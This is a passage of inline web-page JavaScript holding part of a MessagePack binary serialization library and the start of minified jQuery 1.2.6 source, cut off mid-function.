var binary_to_js_array_vbs=function(data){msgpack_set_binary_data(data);return function(position,length){return msgpack_substr(position,length).toArray();}};var bytes_substr=binary_to_js_array_base64(data);this.read=function(length){var j=this.index,i=0;if(j+length<=this.length){return bytes_substr(j,length);}else{throw new Error("MessagePackFailure: index is out of range");}}
this.getc=function(){var j=this.index;if(j<this.length){return bytes_substr(j,1)[0];}else{throw new Error("MessagePackFailure: index is out of range");}}}
p.read=function(length){var j=this.index;if(j+length<=this.length){var bytes=new Array(length);for(var i=length-1;i>=0;--i){bytes[i]=this.data.charCodeAt(j+i)&0xff;}
return bytes;}else{throw new Error("MessagePackFailure: index is out of range");}}
p.getc=function(){var j=this.index;if(j<this.length){return this.data.charCodeAt(j);}
else{throw new Error("MessagePackFailure: index is out of range");}}}
MessagePack.pack=function(data){var enc=new MessagePack.Encoder(data);return enc.pack(data);}
MessagePack.Encoder=function(data,charSet){}
with({p:MessagePack.Encoder.prototype}){p.pack=function(value){var type=typeof(value);if(type=="string"){return this.pack_string(value);}
else if(type=="number"){if(Math.floor(value)===value){return this.pack_integer(value);}
else{return this.pack_double(value);}}
else if(type=="boolean"){if(value===true){return"\xc3";}
else if(value===false){return"\xc2";}}
else if(type=="object"){if(value===null){return"\xc0";}
var constructor=value.constructor;if(constructor==Array){return this.pack_array(value);}
else if(constructor==Object){return this.pack_object(value);}
else{throw new Error("not yet supported")}}}
p.pack_string=function(str){var length=str.length;if(length<=0x1f){return this.pack_uint8(0xa0+length)+str;}
else if(length<=0xffff){return"\xda"+this.pack_uint16(length)+str;}
else if(length<=0xffffffff){return"\xdb"+this.pack_uint32(length)+str;}
else{throw new Error("invalid length");}}
p.pack_array=function(ary){var length=ary.length;var str;if(length<=0x0f){str=this.pack_uint8(0x90+length);}
else if(length<=0xffff){str="\xdc"+this.pack_uint16(length);}
else if(length<=0xffffffff){str="\xdd"+this.pack_uint32(length);}
else{throw new Error("invalid length");}
var elems=[];for(var i=0;i<length;i++){elems.push(this.pack(ary[i]));}
return str+elems.join("");}
p.pack_integer=function(num){if(-0x20<=num&&num<=0x7f){return String.fromCharCode(num&0xff);}
else if(0x00<=num&&num<=0xff){return"\xcc"+this.pack_uint8(num);}
else if(-0x80<=num&&num<=0x7f){return"\xd0"+this.pack_int8(num);}
else if(0x0000<=num&&num<=0xffff){return"\xcd"+this.pack_uint16(num);}
else if(-0x8000<=num&&num<=0x7fff){return"\xd1"+this.pack_int16(num);}
else if(0x00000000<=num&&num<=0xffffffff){return"\xce"+this.pack_uint32(num);}
else if(-0x80000000<=num&&num<=0x7fffffff){return"\xd2"+this.pack_int32(num);}
else if(-0x8000000000000000<=num&&num<=0x7FFFFFFFFFFFFFFF){return"\xd3"+this.pack_int64(num);}
else if(0x0000000000000000<=num&&num<=0xFFFFFFFFFFFFFFFF){return"\xcf"+this.pack_uint64(num);}
else{throw new Error("invalid integer");}}
p.pack_double=function(num){var sign=0;if(num<0){sign=1;num=-num;}
var exp=Math.floor(Math.log(num)/Math.LN2);var frac0=num/Math.pow(2,exp)-1;var frac1=Math.floor(frac0*Math.pow(2,52));var b32=Math.pow(2,32);var h32=(sign<<31)|((exp+1023)<<20)|(frac1/b32)&0x0fffff;var l32=frac1%b32;return"\xcb"+this.pack_int32(h32)+this.pack_int32(l32);}
p.pack_object=function(obj){var str="";var length=0;var ary=[];for(var prop in obj){if(obj.hasOwnProperty(prop)){length++;ary.push(this.pack(prop));ary.push(this.pack(obj[prop]));}}
if(length<=0x0f){return this.pack_uint8(0x80+length)+ary.join("");}
else if(length<=0xffff){return"\xde"+this.pack_uint16(length)+ary.join("");}
else if(length<=0xffffffff){return"\xdf"+this.pack_uint32(length)+ary.join("");}
else{throw new Error("invalid length");}}
p.pack_uint8=function(num){return String.fromCharCode(num);}
p.pack_uint16=function(num){return String.fromCharCode(num>>8,num&0xff);}
p.pack_uint32=function(num){var n=num&0xffffffff;return String.fromCharCode((n&0xff000000)>>>24,(n&0x00ff0000)>>>16,(n&0x0000ff00)>>>8,(n&0x000000ff));}
p.pack_uint64=function(num){var high=num/Math.pow(2,32);var low=num%Math.pow(2,32);return String.fromCharCode((high&0xff000000)>>>24,(high&0x00ff0000)>>>16,(high&0x0000ff00)>>>8,(high&0x000000ff),(low&0xff000000)>>>24,(low&0x00ff0000)>>>16,(low&0x0000ff00)>>>8,(low&0x000000ff));}
p.pack_int8=function(num){return String.fromCharCode(num&0xff);}
p.pack_int16=function(num){return String.fromCharCode((num&0xff00)>>8,num&0xff);}
p.pack_int32=function(num){return String.fromCharCode((num>>>24)&0xff,(num&0x00ff0000)>>>16,(num&0x0000ff00)>>>8,(num&0x000000ff));}
p.pack_int64=function(num){var high=Math.floor(num/Math.pow(2,32));var low=num%Math.pow(2,32);return String.fromCharCode((high&0xff000000)>>>24,(high&0x00ff0000)>>>16,(high&0x0000ff00)>>>8,(high&0x000000ff),(low&0xff000000)>>>24,(low&0x00ff0000)>>>16,(low&0x0000ff00)>>>8,(low&0x000000ff));}}</script>
    <script type="text/javascript">
(function(){var _jQuery=window.jQuery,_$=window.$;var jQuery=window.jQuery=window.$=function(selector,context){return new jQuery.fn.init(selector,context);};var quickExpr=/^[^<]*(<(.|\s)+>)[^>]*$|^#(\w+)$/,isSimple=/^.[^:#\[\.]*$/,undefined;jQuery.fn=jQuery.prototype={init:function(selector,context){selector=selector||document;if(selector.nodeType){this[0]=selector;this.length=1;return this;}if(typeof selector=="string"){var match=quickExpr.exec(selector);if(match&&(match[1]||!context)){if(match[1])selector=jQuery.clean([match[1]],context);else{var elem=document.getElementById(match[3]);if(elem){if(elem.id!=match[3])return jQuery().find(selector);return jQuery(elem);}selector=[];}}else
return jQuery(context).find(selector);}else if(jQuery.isFunction(selector))return jQuery(document)[jQuery.fn.ready?"ready":"load"](selector);return this.setArray(jQuery.makeArray(selector));},jquery:"1.2.6",size:function(){return this.length;},length:0,get:function(num){return num==undefined?jQuery.makeArray(this):this[num];},pushStack:function(elems){var ret=jQuery(elems);ret.prevObject=this;return ret;},setArray:function(elems){this.length=0;Array.prototype.push.apply(this,elems);return this;},each:function(callback,args){return jQuery.each(this,callback,args);},index:function(elem){var ret=-1;return jQuery.inArray(elem&&elem.jquery?elem[0]:elem,this);},attr:function(name,value,type){var options=name;if(name.constructor==String)if(value===undefined)return this[0]&&jQuery[type||"attr"](this[0],name);else{options={};options[name]=value;}return this.each(function(i){for(name in options)jQuery.attr(type?this.style:this,name,jQuery.prop(this,options[name],type,i,name));});},css:function(key,value){if((key=='width'||key=='height')&&parseFloat(value)<0)value=undefined;return this.attr(key,value,"curCSS");},text:function(text){if(typeof text!="object"&&text!=null)return this.empty().append((this[0]&&this[0].ownerDocument||document).createTextNode(text));var ret="";jQuery.each(text||this,function(){jQuery.each(this.childNodes,function(){if(this.nodeType!=8)ret+=this.nodeType!=1?this.nodeValue:jQuery.fn.text([this]);});});return ret;},wrapAll:function(html){if(this[0])jQuery(html,this[0].ownerDocument).clone().insertBefore(this[0]).map(function(){var elem=this;while(elem.firstChild)elem=elem.firstChild;return elem;}).append(this);return this;},wrapInner:function(html){return this.each(function(){jQuery(this).contents().wrapAll(html);});},wrap:function(html){return this.each(function(){jQuery(this).wrapAll(html);});},append:function(){return this.domManip(arguments,true,false,function(elem){if(this.nodeType==1)this.appendChild(elem);});},prepend:function(){return this.domManip(arguments,true,true,function(elem){if(this.nodeType==1)this.insertBefore(elem,this.firstChild);});},before:function(){return this.domManip(arguments,false,false,function(elem){this.parentNode.insertBefore(elem,this);});},after:function(){return this.domManip(arguments,false,true,function(elem){this.parentNode.insertBefore(elem,this.nextSibling);});},end:function(){return this.prevObject||jQuery([]);},find:function(selector){var elems=jQuery.map(this,function(elem){return jQuery.find(selector,elem);});return this.pushStack(/[^+>] [^+>]/.test(selector)||selector.indexOf("..")>-1?jQuery.unique(elems):elems);},clone:function(events){var ret=this.map(function(){if(jQuery.browser.msie&&!jQuery.isXMLDoc(this)){var clone=this.cloneNode(true),container=document.createElement("div");container.appendChild(clone);return jQuery.clean([container.innerHTML])[0];}else
return this.cloneNode(true);});var clone=ret.find("*").andSelf().each(function(){if(this[expando]!=undefined)this[expando]=null;});if(events===true)this.find("*").andSelf().each(function(i){if(this.nodeType==3)return;var events=jQuery.data(this,"events");for(var type in events)for(var handler in events[type])jQuery.event.add(clone[i],type,events[type][handler],events[type][handler].data);});return ret;},filter:function(selector){return this.pushStack(jQuery.isFunction(selector)&&jQuery.grep(this,function(elem,i){return selector.call(elem,i);})||jQuery.multiFilter(selector,this));},not:function(selector){if(selector.constructor==String)if(isSimple.test(selector))return this.pushStack(jQuery.multiFilter(selector,this,true));else
selector=jQuery.multiFilter(selector,this);var isArrayLike=selector.length&&selector[selector.length-1]!==undefined&&!selector.nodeType;return this.filter(function(){return isArrayLike?jQuery.inArray(this,selector)<0:this!=selector;});},add:function(selector){return this.pushStack(jQuery.unique(jQuery.merge(this.get(),typeof selector=='string'?jQuery(selector):jQuery.makeArray(selector))));},is:function(selector){return!!selector&&jQuery.multiFilter(selector,this).length>0;},hasClass:function(selector){return this.is("."+selector);},val:function(value){if(value==undefined){if(this.length){var elem=this[0];if(jQuery.nodeName(elem,"select")){var index=elem.selectedIndex,values=[],options=elem.options,one=elem.type=="select-one";if(index<0)return null;for(var i=one?index:0,max=one?index+1:options.length;i<max;i++){var option=options[i];if(option.selected){value=jQuery.browser.msie&&!option.attributes.value.specified?option.text:option.value;if(one)return value;values.push(value);}}return values;}else
return(this[0].value||"").replace(/\r/g,"");}return undefined;}if(value.constructor==Number)value+='';return this.each(function(){if(this.nodeType!=1)return;if(value.constructor==Array&&/radio|checkbox/.test(this.type))this.checked=(jQuery.inArray(this.value,value)>=0||jQuery.inArray(this.name,value)>=0);else if(jQuery.nodeName(this,"select")){var values=jQuery.makeArray(value);jQuery("option",this).each(function(){this.selected=(jQuery.inArray(this.value,values)>=0||jQuery.inArray(this.text,values)>=0);});if(!values.length)this.selectedIndex=-1;}else
this.value=value;});},html:function(value){return value==undefined?(this[0]?this[0].innerHTML:null):this.empty().append(value);},replaceWith:function(value){return this.after(value).remove();},eq:function(i){return this.slice(i,i+1);},slice:function(){return this.pushStack(Array.prototype.slice.apply(this,arguments));},map:function(callback){return this.pushStack(jQuery.map(this,function(elem,i){return callback.call(elem,i,elem);}));},andSelf:function(){return this.add(this.prevObject);},data:function(key,value){var parts=key.split(".");parts[1]=parts[1]?"."+parts[1]:"";if(value===undefined){var data=this.triggerHandler("getData"+parts[1]+"!",[parts[0]]);if(data===undefined&&this.length)data=jQuery.data(this[0],key);return data===undefined&&parts[1]?this.data(parts[0]):data;}else
return this.trigger("setData"+parts[1]+"!",[parts[0],value]).each(function(){jQuery.data(this,key,value);});},removeData:function(key){return this.each(function(){jQuery.removeData(this,key);});},domManip:function(args,table,reverse,callback){var clone=this.length>1,elems;return this.each(function(){if(!elems){elems=jQuery.clean(args,this.ownerDocument);if(reverse)elems.reverse();}var obj=this;if(table&&jQuery.nodeName(this,"table")&&jQuery.nodeName(elems[0],"tr"))obj=this.getElementsByTagName("tbody")[0]||this.appendChild(this.ownerDocument.createElement("tbody"));var scripts=jQuery([]);jQuery.each(elems,function(){var elem=clone?jQuery(this).clone(true)[0]:this;if(jQuery.nodeName(elem,"script"))scripts=scripts.add(elem);else{if(elem.nodeType==1)scripts=scripts.add(jQuery("script",elem).remove());callback.call(obj,elem);}});scripts.each(evalScript);});}};jQuery.fn.init.prototype=jQuery.fn;function evalScript(i,elem){if(elem.src)jQuery.ajax({url:elem.src,async:false,dataType:"script"});else
jQuery.globalEval(elem.text||elem.textContent||elem.innerHTML||"");if(elem.parentNode)elem.parentNode.removeChild(elem);}function now(){return+new Date;}jQuery.extend=jQuery.fn.extend=function(){var target=arguments[0]||{},i=1,length=arguments.length,deep=false,options;if(target.constructor==Boolean){deep=target;target=arguments[1]||{};i=2;}if(typeof target!="object"&&typeof target!="function")target={};if(length==i){target=this;--i;}for(;i<length;i++)if((options=arguments[i])!=null)for(var name in options){var src=target[name],copy=options[name];if(target===copy)continue;if(deep&&copy&&typeof copy=="object"&&!copy.nodeType)target[name]=jQuery.extend(deep,src||(copy.length!=null?[]:{}),copy);else if(copy!==undefined)target[name]=copy;}return target;};var expando="jQuery"+now(),uuid=0,windowData={},exclude=/z-?index|font-?weight|opacity|zoom|line-?height/i,defaultView=document.defaultView||{};jQuery.extend({noConflict:function(deep){window.$=_$;if(deep)window.jQuery=_jQuery;return jQuery;},isFunction:function(fn){return!!fn&&typeof fn!="string"&&!fn.nodeName&&fn.constructor!=Array&&/^[\s[]?function/.test(fn+"");},isXMLDoc:function(elem){return elem.documentElement&&!elem.body||elem.tagName&&elem.ownerDocument&&!elem.ownerDocument.body;},globalEval:function(data){data=jQuery.trim(data);if(data){var head=document.getElementsByTagName("head")[0]||document.documentElement,script=document.createElement("script");script.type="text/javascript";if(jQuery.browser.msie)script.text=data;else
script.appendChild(document.createTextNode(data));head.insertBefore(script,head.firstChild);head.removeChild(script);}},nodeName:function(elem,name){return elem.nodeName&&elem.nodeName.toUpperCase()==name.toUpperCase();},cache:{},data:function(elem,name,data){elem=elem==window?windowData:elem;var id=elem[expando];if(!id)id=elem[expando]=++uuid;if(name&&!jQuery.cache[id])jQuery.cache[id]={};if(data!==undefined)jQuery.cache[id][name]=data;return name?jQuery.cache[id][name]:id;},removeData:function(elem,name){elem=elem==window?windowData:elem;var id=elem[expando];if(name){if(jQuery.cache[id]){delete jQuery.cache[id][name];name="";for(name in jQuery.cache[id])break;if(!name)jQuery.removeData(elem);}}else{try{delete elem[expando];}catch(e){if(elem.removeAttribute)elem.removeAttribute(expando);}delete jQuery.cache[id];}},each:function(object,callback,args){var name,i=0,length=object.length;if(args){if(length==undefined){for(name in object)if(callback.apply(object[name],args)===false)break;}else
for(;i<length;)if(callback.apply(object[i++],args)===false)break;}else{if(length==undefined){for(name in object)if(callback.call(object[name],name,object[name])===false)break;}else
for(var value=object[0];i<length&&callback.call(value,i,value)!==false;value=object[++i]){}}return object;},prop:function(elem,value,type,i,name){if(jQuery.isFunction(value))value=value.call(elem,i);return value&&value.constructor==Number&&type=="curCSS"&&!exclude.test(name)?value+"px":value;},className:{add:function(elem,classNames){jQuery.each((classNames||"").split(/\s+/),function(i,className){if(elem.nodeType==1&&!jQuery.className.has(elem.className,className))elem.className+=(elem.className?" ":"")+className;});},remove:function(elem,classNames){if(elem.nodeType==1)elem.className=classNames!=undefined?jQuery.grep(elem.className.split(/\s+/),function(className){return!jQuery.className.has(classNames,className);}).join(" "):"";},has:function(elem,className){return jQuery.inArray(className,(elem.className||elem).toString().split(/\s+/))>-1;}},swap:function(elem,options,callback){var old={};for(var name in options){old[name]=elem.style[name];elem.style[name]=options[name];}callback.call(elem);for(var name in options)elem.style[name]=old[name];},css:function(elem,name,force){if(name=="width"||name=="height"){var val,props={position:"absolute",visibility:"hidden",display:"block"},which=name=="width"?["Left","Right"]:["Top","Bottom"];function getWH(){val=name=="width"?elem.offsetWidth:elem.offsetHeight;var padding=0,border=0;jQuery.each(which,function(){padding+=parseFloat(jQuery.curCSS(elem,"padding"+this,true))||0;border+=parseFloat(jQuery.curCSS(elem,"border"+this+"Width",true))||0;});val-=Math.round(padding+border);}if(jQuery(elem).is(":visible"))getWH();else
jQuery.swap(elem,props,getWH);return Math.max(0,val);}return jQuery.curCSS(elem,name,force);},curCSS:function(elem,name,force){var ret,style=elem.style;function color(elem){if(!jQuery.browser.safari)return false;var ret=defaultView.getComputedStyle(elem,null);return!ret||ret.getPropertyValue("color")=="";}if(name=="opacity"&&jQuery.browser.msie){ret=jQuery.attr(style,"opacity");return ret==""?"1":ret;}if(jQuery.browser.opera&&name=="display"){var save=style.outline;style.outline="0 solid black";style.outline=save;}if(name.match(/float/i))name=styleFloat;if(!force&&style&&style[name])ret=style[name];else if(defaultView.getComputedStyle){if(name.match(/float/i))name="float";name=name.replace(/([A-Z])/g,"-$1").toLowerCase();var computedStyle=defaultView.getComputedStyle(elem,null);if(computedStyle&&!color(elem))ret=computedStyle.getPropertyValue(name);else{var swap=[],stack=[],a=elem,i=0;for(;a&&color(a);a=a.parentNode)stack.unshift(a);for(;i<stack.length;i++)if(color(stack[i])){swap[i]=stack[i].style.display;stack[i].style.display="block";}ret=name=="display"&&swap[stack.length-1]!=null?"none":(computedStyle&&computedStyle.getPropertyValue(name))||"";for(i=0;i<swap.length;i++)if(swap[i]!=null)stack[i].style.display=swap[i];}if(name=="opacity"&&ret=="")ret="1";}else if(elem.currentStyle){var camelCase=name.replace(/\-(\w)/g,function(all,letter){return letter.toUpperCase();});ret=elem.currentStyle[name]||elem.currentStyle[camelCase];if(!/^\d+(px)?$/i.test(ret)&&/^\d/.test(ret)){var left=style.left,rsLeft=elem.runtimeStyle.left;elem.runtimeStyle.left=elem.currentStyle.left;style.left=ret||0;ret=style.pixelLeft+"px";style.left=left;elem.runtimeStyle.left=rsLeft;}}return ret;},clean:function(elems,context){var ret=[];context=context||document;if(typeof context.createElement=='undefined')context=context.ownerDocument||context[0]&&context[0].ownerDocument||document;jQuery.each(elems,function(i,elem){if(!elem)return;if(elem.constructor==Number)elem+='';if(typeof elem=="string"){elem=elem.replace(/(<(\w+)[^>]*?)\/>/g,function(all,front,tag){return tag.match(/^(abbr|br|col|img|input|link|meta|param|hr|area|embed)$/i)?all:front+"></"+tag+">";});var tags=jQuery.trim(elem).toLowerCase(),div=context.createElement("div");var wrap=!tags.indexOf("<opt")&&[1,"<select multiple='multiple'>","</select>"]||!tags.indexOf("<leg")&&[1,"<fieldset>","</fieldset>"]||tags.match(/^<(thead|tbody|tfoot|colg|cap)/)&&[1,"<table>","</table>"]||!tags.indexOf("<tr")&&[2,"<table><tbody>","</tbody></table>"]||(!tags.indexOf("<td")||!tags.indexOf("<th"))&&[3,"<table><tbody><tr>","</tr></tbody></table>"]||!tags.indexOf("<col")&&[2,"<table><tbody></tbody><colgroup>","</colgroup></table>"]||jQuery.browser.msie&&[1,"div<div>","</div>"]||[0,"",""];div.innerHTML=wrap[1]+elem+wrap[2];while(wrap[0]--)div=div.lastChild;if(jQuery.browser.msie){var tbody=!tags.indexOf("<table")&&tags.indexOf("<tbody")<0?div.firstChild&&div.firstChild.childNodes:wrap[1]=="<table>"&&tags.indexOf("<tbody")<0?div.childNodes:[];for(var j=tbody.length-1;j>=0;--j)if(jQuery.nodeName(tbody[j],"tbody")&&!tbody[j].childNodes.length)tbody[j].parentNode.removeChild(tbody[j]);if(/^\s/.test(elem))div.insertBefore(context.createTextNode(elem.match(/^\s*/)[0]),div.firstChild);}elem=jQuery.makeArray(div.childNodes);}if(elem.length===0&&(!jQuery.nodeName(elem,"form")&&!jQuery.nodeName(elem,"select")))return;if(elem[0]==undefined||jQuery.nodeName(elem,"form")||elem.options)ret.push(elem);else
ret=jQuery.merge(ret,elem);});return ret;},attr:function(elem,name,value){if(!elem||elem.nodeType==3||elem.nodeType==8)return undefined;var notxml=!jQuery.isXMLDoc(elem),set=value!==undefined,msie=jQuery.browser.msie;name=notxml&&jQuery.props[name]||name;if(elem.tagName){var special=/href|src|style/.test(name);if(name=="selected"&&jQuery.browser.safari)elem.parentNode.selectedIndex;if(name in elem&&notxml&&!special){if(set){if(name=="type"&&jQuery.nodeName(elem,"input")&&elem.parentNode)throw"type property can't be changed";elem[name]=value;}if(jQuery.nodeName(elem,"form")&&elem.getAttributeNode(name))return elem.getAttributeNode(name).nodeValue;return elem[name];}if(msie&&notxml&&name=="style")return jQuery.attr(elem.style,"cssText",value);if(set)elem.setAttribute(name,""+value);var attr=msie&&notxml&&special?elem.getAttribute(name,2):elem.getAttribute(name);return attr===null?undefined:attr;}if(msie&&name=="opacity"){if(set){elem.zoom=1;elem.filter=(elem.filter||"").replace(/alpha\([^)]*\)/,"")+(parseInt(value)+''=="NaN"?"":"alpha(opacity="+value*100+")");}return elem.filter&&elem.filter.indexOf("opacity=")>=0?(parseFloat(elem.filter.match(/opacity=([^)]*)/)[1])/100)+'':"";}name=name.replace(/-([a-z])/ig,function(all,letter){return letter.toUpperCase();});if(set)elem[name]=value;return elem[name];},trim:function(text){return(text||"").replace(/^\s+|\s+$/g,"");},makeArray:function(array){var ret=[];if(array!=null){var i=array.length;if(i==null||array.split||array.setInterval||array.call)ret[0]=array;else
while(i)ret[--i]=array[i];}return ret;},inArray:function(elem,array){for(var i=0,length=array.length;i<length;i++)if(array[i]===elem)return i;return-1;},merge:function(first,second){var i=0,elem,pos=first.length;if(jQuery.browser.msie){while(elem=second[i++])if(elem.nodeType!=8)first[pos++]=elem;}else
while(elem=second[i++])first[pos++]=elem;return first;},unique:function(array){var ret=[],done={};try{for(var i=0,length=array.length;i<length;i++){var id=jQuery.data(array[i]);if(!done[id]){done[id]=true;ret.push(array[i]);}}}catch(e){ret=array;}return ret;},grep:function(elems,callback,inv){var ret=[];for(var i=0,length=elems.length;i<length;i++)if(!inv!=!callback(elems[i],i))ret.push(elems[i]);return ret;},map:function(elems,callback){var ret=[];for(var i=0,length=elems.length;i<length;i++){var value=callback(elems[i],i);if(value!=null)ret[ret.length]=value;}return ret.concat.apply([],ret);}});var userAgent=navigator.userAgent.toLowerCase();jQuery.browser={version:(userAgent.match(/.+(?:rv|it|ra|ie)[\/: ]([\d.]+)/)||[])[1],safari:/webkit/.test(userAgent),opera:/opera/.test(userAgent),msie:/msie/.test(userAgent)&&!/opera/.test(userAgent),mozilla:/mozilla/.test(userAgent)&&!/(compatible|webkit)/.test(userAgent)};var styleFloat=jQuery.browser.msie?"styleFloat":"cssFloat";jQuery.extend({boxModel:!jQuery.browser.msie||document.compatMode=="CSS1Compat",props:{"for":"htmlFor","class":"className","float":styleFloat,cssFloat:styleFloat,styleFloat:styleFloat,readonly:"readOnly",maxlength:"maxLength",cellspacing:"cellSpacing"}});jQuery.each({parent:function(elem){return elem.parentNode;},parents:function(elem){return jQuery.dir(elem,"parentNode");},next:function(elem){return jQuery.nth(elem,2,"nextSibling");},prev:function(elem){return jQuery.nth(elem,2,"previousSibling");},nextAll:function(elem){return jQuery.dir(elem,"nextSibling");},prevAll:function(elem){return jQuery.dir(elem,"previousSibling");},siblings:function(elem){return jQuery.sibling(elem.parentNode.firstChild,elem);},children:function(elem){return jQuery.sibling(elem.firstChild);},contents:function(elem){return jQuery.nodeName(elem,"iframe")?elem.contentDocument||elem.contentWindow.document:jQuery.makeArray(elem.childNodes);}},function(name,fn){jQuery.fn[name]=function(selector){var ret=jQuery.map(this,fn);if(selector&&typeof selector=="string")ret=jQuery.multiFilter(selector,ret);return this.pushStack(jQuery.unique(ret));};});jQuery.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(name,original){jQuery.fn[name]=function(){var args=arguments;return this.each(function(){for(var i=0,length=args.length;i<length;i++)jQuery(args[i])[original](this);});};});jQuery.each({removeAttr:function(name){jQuery.attr(this,name,"");if(this.nodeType==1)this.removeAttribute(name);},addClass:function(classNames){jQuery.className.add(this,classNames);},removeClass:function(classNames){jQuery.className.remove(this,classNames);},toggleClass:function(classNames){jQuery.className[jQuery.className.has(this,classNames)?"remove":"add"](this,classNames);},remove:function(selector){if(!selector||jQuery.filter(selector,[this]).r.length){jQuery("*",this).add(this).each(function(){jQuery.event.remove(this);jQuery.removeData(this);});if(this.parentNode)this.parentNode.removeChild(this);}},empty:function(){jQuery(">*",this).remove();while(this.firstChild)this.removeChild(this.firstChild);}},function(name,fn){jQuery.fn[name]=function(){return this.each(fn,arguments);};});jQuery.each(["Height","Width"],function(i,name){var type=name.toLowerCase();jQuery.fn[type]=function(size){return this[0]==window?jQuery.browser.opera&&document.body["client"+name]||jQuery.browser.safari&&window["inner"+name]||document.compatMode=="CSS1Compat"&&document.documentElement["client"+name]||document.body["client"+name]:this[0]==document?Math.max(Math.max(document.body["scroll"+name],document.documentElement["scroll"+name]),Math.max(document.body["offset"+name],document.documentElement["offset"+name])):size==undefined?(this.length?jQuery.css(this[0],type):null):this.css(type,size.constructor==String?size:size+"px");};});function num(elem,prop){return elem[0]&&parseInt(jQuery.curCSS(elem[0],prop,true),10)||0;}var chars=jQuery.browser.safari&&parseInt(jQuery.browser.version)<417?"(?:[\\w*_-]|\\\\.)":"(?:[\\w\u0128-\uFFFF*_-]|\\\\.)",quickChild=new RegExp("^>\\s*("+chars+"+)"),quickID=new RegExp("^("+chars+"+)(#)("+chars+"+)"),quickClass=new RegExp("^([#.]?)("+chars+"*)");jQuery.extend({expr:{"":function(a,i,m){return m[2]=="*"||jQuery.nodeName(a,m[2]);},"#":function(a,i,m){return a.getAttribute("id")==m[2];},":":{lt:function(a,i,m){return i<m[3]-0;},gt:function(a,i,m){return i>m[3]-0;},nth:function(a,i,m){return m[3]-0==i;},eq:function(a,i,m){return m[3]-0==i;},first:function(a,i){return i==0;},last:function(a,i,m,r){return i==r.length-1;},even:function(a,i){return i%2==0;},odd:function(a,i){return i%2;},"first-child":function(a){return a.parentNode.getElementsByTagName("*")[0]==a;},"last-child":function(a){return jQuery.nth(a.parentNode.lastChild,1,"previousSibling")==a;},"only-child":function(a){return!jQuery.nth(a.parentNode.lastChild,2,"previousSibling");},parent:function(a){return a.firstChild;},empty:function(a){return!a.firstChild;},contains:function(a,i,m){return(a.textContent||a.innerText||jQuery(a).text()||"").indexOf(m[3])>=0;},visible:function(a){return"hidden"!=a.type&&jQuery.css(a,"display")!="none"&&jQuery.css(a,"visibility")!="hidden";},hidden:function(a){return"hidden"==a.type||jQuery.css(a,"display")=="none"||jQuery.css(a,"visibility")=="hidden";},enabled:function(a){return!a.disabled;},disabled:function(a){return a.disabled;},checked:function(a){return a.checked;},selected:function(a){return a.selected||jQuery.attr(a,"selected");},text:function(a){return"text"==a.type;},radio:function(a){return"radio"==a.type;},checkbox:function(a){return"checkbox"==a.type;},file:function(a){return"file"==a.type;},password:function(a){return"password"==a.type;},submit:function(a){return"submit"==a.type;},image:function(a){return"image"==a.type;},reset:function(a){return"reset"==a.type;},button:function(a){return"button"==a.type||jQuery.nodeName(a,"button");},input:function(a){return/input|select|textarea|button/i.test(a.nodeName);},has:function(a,i,m){return jQuery.find(m[3],a).length;},header:function(a){return/h\d/i.test(a.nodeName);},animated:function(a){return jQuery.grep(jQuery.timers,function(fn){return a==fn.elem;}).length;}}},parse:[/^(\[) *@?([\w-]+) *([!*$^~=]*) *('?"?)(.*?)\4 *\]/,/^(:)([\w-]+)\("?'?(.*?(\(.*?\))?[^(]*?)"?'?\)/,new RegExp("^([:.#]*)("+chars+"+)")],multiFilter:function(expr,elems,not){var old,cur=[];while(expr&&expr!=old){old=expr;var f=jQuery.filter(expr,elems,not);expr=f.t.replace(/^\s*,\s*/,"");cur=not?elems=f.r:jQuery.merge(cur,f.r);}return cur;},find:function(t,context){if(typeof t!="string")return[t];if(context&&context.nodeType!=1&&context.nodeType!=9)return[];context=context||document;var ret=[context],done=[],last,nodeName;while(t&&last!=t){var r=[];last=t;t=jQuery.trim(t);var foundToken=false,re=quickChild,m=re.exec(t);if(m){nodeName=m[1].toUpperCase();for(var i=0;ret[i];i++)for(var c=ret[i].firstChild;c;c=c.nextSibling)if(c.nodeType==1&&(nodeName=="*"||c.nodeName.toUpperCase()==nodeName))r.push(c);ret=r;t=t.replace(re,"");if(t.indexOf(" ")==0)continue;foundToken=true;}else{re=/^([>+~])\s*(\w*)/i;if((m=re.exec(t))!=null){r=[];var merge={};nodeName=m[2].toUpperCase();m=m[1];for(var j=0,rl=ret.length;j<rl;j++){var n=m=="~"||m=="+"?ret[j].nextSibling:ret[j].firstChild;for(;n;n=n.nextSibling)if(n.nodeType==1){var id=jQuery.data(n);if(m=="~"&&merge[id])break;if(!nodeName||n.nodeName.toUpperCase()==nodeName){if(m=="~")merge[id]=true;r.push(n);}if(m=="+")break;}}ret=r;t=jQuery.trim(t.replace(re,""));foundToken=true;}}if(t&&!foundToken){if(!t.indexOf(",")){if(context==ret[0])ret.shift();done=jQuery.merge(done,ret);r=ret=[context];t=" "+t.substr(1,t.length);}else{var re2=quickID;var m=re2.exec(t);if(m){m=[0,m[2],m[3],m[1]];}else{re2=quickClass;m=re2.exec(t);}m[2]=m[2].replace(/\\/g,"");var elem=ret[ret.length-1];if(m[1]=="#"&&elem&&elem.getElementById&&!jQuery.isXMLDoc(elem)){var oid=elem.getElementById(m[2]);if((jQuery.browser.msie||jQuery.browser.opera)&&oid&&typeof oid.id=="string"&&oid.id!=m[2])oid=jQuery('[@id="'+m[2]+'"]',elem)[0];ret=r=oid&&(!m[3]||jQuery.nodeName(oid,m[3]))?[oid]:[];}else{for(var i=0;ret[i];i++){var tag=m[1]=="#"&&m[3]?m[3]:m[1]!=""||m[0]==""?"*":m[2];if(tag=="*"&&ret[i].nodeName.toLowerCase()=="object")tag="param";r=jQuery.merge(r,ret[i].getElementsByTagName(tag));}if(m[1]==".")r=jQuery.classFilter(r,m[2]);if(m[1]=="#"){var tmp=[];for(var i=0;r[i];i++)if(r[i].getAttribute("id")==m[2]){tmp=[r[i]];break;}r=tmp;}ret=r;}t=t.replace(re2,"");}}if(t){var val=jQuery.filter(t,r);ret=r=val.r;t=jQuery.trim(val.t);}}if(t)ret=[];if(ret&&context==ret[0])ret.shift();done=jQuery.merge(done,ret);return done;},classFilter:function(r,m,not){m=" "+m+" ";var tmp=[];for(var i=0;r[i];i++){var pass=(" "+r[i].className+" ").indexOf(m)>=0;if(!not&&pass||not&&!pass)tmp.push(r[i]);}return tmp;},filter:function(t,r,not){var last;while(t&&t!=last){last=t;var p=jQuery.parse,m;for(var 